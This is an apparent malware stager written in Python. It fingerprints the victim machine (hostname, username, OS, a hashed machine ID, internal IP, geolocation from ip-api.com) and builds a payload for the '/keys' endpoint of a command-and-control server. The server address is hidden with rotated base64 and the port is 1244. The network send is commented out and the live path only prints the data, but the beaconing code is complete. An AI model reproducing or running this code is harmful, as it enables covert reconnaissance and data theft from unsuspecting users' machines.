import base64,socket
from uuid import getnode
from requests import get,post
from getpass import getuser
from hashlib import sha256
from platform import node,version,release,system
import time

sType = 'ZU1RINz7'

class System(object):
    def __init__(A):A.s=system();A.hn=node();A.rel=release();A.v=version();A.un=getuser();A.uuid=A.get_id()
    def get_id(A):return sha256((str(getnode())+getuser()).encode()).digest().hex()
    def info(A):return{'uuid':A.uuid,'system':A.s,'release':A.rel,'version':A.v,'hostname':A.hn,'username':A.un}

class Geo(object):
    def __init__(A):A.iip=A.local_ip();A.geo=A.get_geo()
    def local_ip(A):
        try:return socket.gethostbyname_ex(hn)[-1][-1]
        except:return''
    def get_geo(A):
        try:return get('http://ip-api.com/json').json()
        except:pass
    def info(A):
        g=A.get_geo()
        if g:
            ii=A.iip
            if ii:g['internalIp']=ii
        return g

class Information(object):
    def __init__(A):A.net_info=Geo().info();A.sys_info=System().info()
    def parse(K,data):
        J='regionName';I='country';H='query';G='city';F='isp';E='zip';D='lon';C='lat';B='timezone';_A='internalIp'
        A=data;A={C:A[C]if C in A else'',D:A[D]if D in A else'',E:A[E]if E in A else'',F:A[F]if F in A else'',G:A[G]if G in A else'',H:A[H]if H in A else'',I:A[I]if I in A else'',B:A[B]if B in A else'',J:A[J]if J in A else'',_A:A[_A]if _A in A else''}
        if'/'in A[B]:A[B]=A[B].replace('/',' ')
        if'_'in A[B]:A[B]=A[B].replace('_',' ')
        return A
    def get_info(A):B=A.net_info;return{'sys_info':A.sys_info,'net_info':A.parse(B if B else[])}

host="cuMTcx====NjcuMjAzLj"
PORT = 1244
HOST = base64.b64decode(host[10:] + host[:10]).decode()
# hn = socket.gethostname()

class Comm(object):
    def __init__(A):A.sys_info=Information().get_info()
    def contact_server(A,ip,port):
        A.ip,A.port=ip,int(port);B=int(time.time()*1000);C={'ts':str(B),'type':sType,'hid':"hn",'ss':'sys_info','cc':str(A.sys_info)};D=f"http://{A.ip}:{A.port}/keys"
        try:post(D,data=C)
        except Exception as e:pass
    def log(A,ip,port):
        A.ip,A.port=ip,int(port);B=int(time.time()*1000);C={'ts':str(B),'type':sType,'hid':"hn",'ss':'sys_info','cc':str(A.sys_info)};D=f"http://{A.ip}:{A.port}/keys"
        print(C)
        print(D)

# def run_comm():c=Comm();c.contact_server(HOST, PORT);del c
# run_comm()

def run_log():c=Comm();c.log(HOST, PORT);del c
run_log()